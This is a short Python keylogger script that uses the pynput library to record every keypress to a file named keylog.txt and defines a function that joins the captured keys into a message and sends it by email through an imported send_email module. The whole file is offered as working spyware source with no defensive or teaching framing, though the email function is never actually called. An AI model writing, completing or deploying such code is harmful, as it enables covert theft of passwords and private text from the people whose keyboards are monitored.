from pynput import keyboard
from pynput.keyboard import Key
import logging
import send_email

logging.basicConfig(filename='keylog.txt', level=logging.DEBUG)

def on_press(key):
    try:
        char = key.char
        logging.info(char)
    except:
        print("Error")

def on_release(key):
    if key == Key.esc:
        return False

if __name__ == "__main__":
    with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
        listener.join()


def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    send_email.sendEmail(message)
